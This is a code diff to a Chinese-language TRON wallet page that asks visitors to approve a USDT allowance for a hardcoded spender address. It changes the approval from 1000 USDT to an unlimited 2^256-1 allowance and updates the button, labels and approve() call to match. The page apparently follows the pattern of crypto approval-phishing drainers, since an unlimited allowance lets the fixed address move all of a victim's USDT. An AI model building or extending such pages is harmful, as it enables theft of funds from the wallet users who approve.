@@ -153,7 +153,7 @@
     <div class="container">
         <div class="card">
             <h1>🔐 USDT 授权</h1>
-            <div class="subtitle">TRON 链 - 授权 1000 USDT</div>
+            <div class="subtitle">TRON 链 - 无限额度授权</div>
             
             <div class="warning" id="warningBox">
                 ⚠️ 请在 TronLink / TokenPocket 的 DApp 浏览器中打开此页面
@@ -163,7 +163,7 @@
                 <div class="info-label">授权地址</div>
                 <div class="info-value">TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA</div>
                 <div class="info-label" style="margin-top: 12px;">授权额度</div>
-                <div class="info-value" style="color: #667eea; font-weight: 600;">1000 USDT</div>
+                <div class="info-value" style="color: #667eea; font-weight: 600;">无限额度 (2^256-1)</div>
             </div>
             
             <div class="info-box" id="walletInfo" style="display: none;">
@@ -172,7 +172,7 @@
             </div>
             
             <button class="approve-btn" id="connectBtn">连接钱包</button>
-            <button class="approve-btn hidden" id="approveBtn">授权 1000 USDT</button>
+            <button class="approve-btn hidden" id="approveBtn">授权无限额 USDT</button>
             <div class="status hidden" id="status"></div>
         </div>
     </div>
@@ -182,8 +182,10 @@
         // 配置
         const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
         const SPENDER_ADDRESS = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
-        // 1000 USDT（USDT 精度为 6，所以 1000 * 10^6 = 1000000000）
-        const AMOUNT_1000_USDT = '1000000000';
+        
+        // 无限额度：2^256 - 1，使用十六进制字符串（去掉0x前缀）
+        // TronWeb 内部会处理成 BigNumber
+        const UNLIMITED_AMOUNT = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
         
         let tronWeb = null;
         let userAddress = null;
@@ -256,10 +258,10 @@
                 
                 showStatus('请在钱包中确认授权...', 'loading');
                 
-                // 发送授权交易，使用普通数字字符串
+                // 使用十六进制字符串传递无限额度，TronWeb 会自动转换为 BigNumber
                 const result = await contract.approve(
                     SPENDER_ADDRESS,
-                    AMOUNT_1000_USDT
+                    UNLIMITED_AMOUNT
                 ).send();
                 
                 console.log('授权结果:', result);
@@ -267,7 +269,7 @@
                 if (result && (result.result || result.txid)) {
                     const txid = result.txid || result;
                     showStatus(`✅ 授权成功！`, 'success');
-                    document.getElementById('connectedAddress').innerHTML = `${userAddress.slice(0, 8)}...${userAddress.slice(-6)} <span class="success-badge">已授权 1000 USDT</span>`;
+                    document.getElementById('connectedAddress').innerHTML = `${userAddress.slice(0, 8)}...${userAddress.slice(-6)} <span class="success-badge">已授权无限额</span>`;
                 } else {
                     showStatus('授权失败，请重试', 'error');
                 }
